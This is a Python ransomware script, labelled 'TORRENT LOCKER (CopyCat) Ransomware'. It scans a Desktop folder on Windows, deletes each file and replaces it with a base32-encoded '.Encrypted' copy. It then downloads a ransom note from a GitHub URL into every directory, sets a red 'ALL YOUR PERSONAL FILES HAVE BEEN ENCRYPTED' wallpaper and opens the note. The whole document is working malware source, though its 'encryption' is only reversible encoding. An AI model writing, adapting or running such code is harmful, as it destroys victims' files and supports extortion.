# Import System
import ctypes,os, requests, sys,time,socket,random,base64
from PIL import Image, ImageDraw, ImageFont

# Scan Files
def scan(path):
    allFiles = []
    for home, sub_files, file_list_s in os.walk(path):
        for name_files in file_list_s:
            if ".Encrypted" in name_files:
                continue
            allFiles.append(os.path.join(home, name_files))
    return allFiles

#Path Files
path_files = os.environ['USERPROFILE'] + '\Desktop\lol'

#Encryption
num = 0
openFiles = scan(path_files)
for file_os in openFiles:
     #Read Files
     files = open(file_os, "rb")
     Data_Text = files.read()
     files.close()

     #Files Remove 
     os.remove(file_os)
     
     # Base Encode (b32hex)
     encodedBytes = base64.b32hexencode(bytes(Data_Text))
     encodedStr = str(encodedBytes,'utf-8')
     
     # Write Files
     output = os.path.join(os.path.dirname(file_os), os.path.basename(file_os) + '.Encrypted')
     files2 = open(output, "w")
     files2.write(encodedStr)
     print(f"[Encryption BASE] -> {str(file_os)}")
     num += 1

# Note
num2 = 0
file_url = 'https://raw.githubusercontent.com/Hex1629/Test/main/DECRYPT_INSTRUCTIONS.html'
response = requests.get(file_url)
for dirName, subdirList, fileList in os.walk(path_files):
    OutputFile = os.path.join(os.path.join(dirName),f"DECRYPT_INSTRUCTIONS.html")
    file = open(OutputFile,'wb')
    file.write(response.content)
    file.close()
    print(f"[Create Note] -> {str(OutputFile)}")
    num2 += 1

#Random Files Name
char_setting = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
char_file = ''
for bit_files in range(15):
    char_file += random.choice(char_setting)

#Create Wallpaper Files
IMG_wallpaper = char_file + '.png'
Img = Image.new("RGB", (2050, 1050))
Canvas= ImageDraw.Draw(Img)
font = ImageFont.truetype("arial", int(55))
Canvas.text((10,10),(f"""
                TORRENT LOCKER (CopyCat) Ransomware\n
                ALL YOUR PERSONAL FILES HAVE BEEN ENCRYPTED!\n
                Files Encrypt: {num}\n
                Files Note: {num2}"""),fill=(255,0,0),font=font)                                                  
Img.save(IMG_wallpaper)
# Set Wallpaper
ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\{IMG_wallpaper}' , 0)
time.sleep(0.3)
# Remove Wallpaper
os.remove(IMG_wallpaper)

os.system(f"{path_files}\DECRYPT_INSTRUCTIONS.html")
